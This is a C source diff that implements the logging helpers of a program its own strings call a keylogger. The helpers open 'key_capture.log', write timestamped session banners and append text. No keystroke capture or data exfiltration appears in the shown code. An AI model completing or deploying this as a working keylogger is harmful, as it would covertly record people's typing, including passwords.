@@ -3,22 +3,46 @@
 #include <stdlib.h>
 #include <time.h>
 
-void InitializeLog(void)
-{
+#define LOGFILE_NAME "key_capture.log"
 
+static FILE *log_file = NULL;
+
+void InitializeLog(void) {
+    if (log_file != NULL) {
+        return;
+    }
+
+    log_file = fopen(LOGFILE_NAME, "a");
+
+    if (log_file == NULL) {
+        return;
+    }
+
+    time_t t = time(NULL);
+    struct tm *tm = localtime(&t);
+    char s[64];
+    strftime(s, sizeof(s), "\n[--- Keylogger Session Start: %Y-%m-%d %H:%M:%S ---]\n", tm);
+
+    fputs(s, log_file);
+    fflush(log_file);
 }
 
-void WriteToLog(const char *text_to_log)
-{
+void WriteToLog(const char *text_to_log) {
+    if (log_file == NULL) {
+        InitializeLog();
+        if (log_file == NULL) return;
+    }
 
+    fputs(text_to_log, log_file);
+
+    fflush(log_file);
 }
 
-void CloseLog(void)
-{
+void CloseLog(void) {
+    if (log_file != NULL) {
+        WriteToLog("[--- Keylogger Session Stop ---]\n");
 
-}
-
-void WriteSpecialKey(int vkCode)
-{
-
+        fclose(log_file);
+        log_file = NULL;
+    }
 }
